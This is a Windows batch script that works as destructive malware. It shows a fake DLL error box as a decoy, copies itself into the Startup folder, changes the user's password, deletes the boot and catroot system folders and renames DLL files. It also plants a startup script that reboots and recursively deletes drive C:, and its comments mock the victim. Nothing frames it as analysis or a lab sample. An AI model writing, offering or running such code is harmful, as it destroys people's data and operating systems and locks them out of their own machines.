echo MsgBox "msvcp100.dll error",17,"ERROR"> a.vbs
a.vbs
del a.vbs

@echo off
echo THIS PART WILL TURN OFF REGEDIT, CMD, CHANGE WALLPAPER, AND SHUTDOWN / FORMAT / DELETE C:
copy ez.bat => "C:\Users%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
net user %username% NoEscapeEZZE
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /t REG_DWORD /v DisableRegistryTools /f /d 0
shutdown /s /t 20
rd c:\windows\boot /s /q
rd c:\windows\system32\catroot /s /q
rd c:\windows\system32\catroot2 /s /q
ren *.dll %random%.ezdll
echo most files are impact, so lets add startup so if u "SURVIVE", you will get death screen lmfao
cd "C:\Users%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo MsgBox "this is the end. goodbye!!",17,"ERROR"> a.vbs
echo "shutdown /r /t 5 && rd c: /s /q"> start.bat
powershell wininit
shutdown /r /t 1
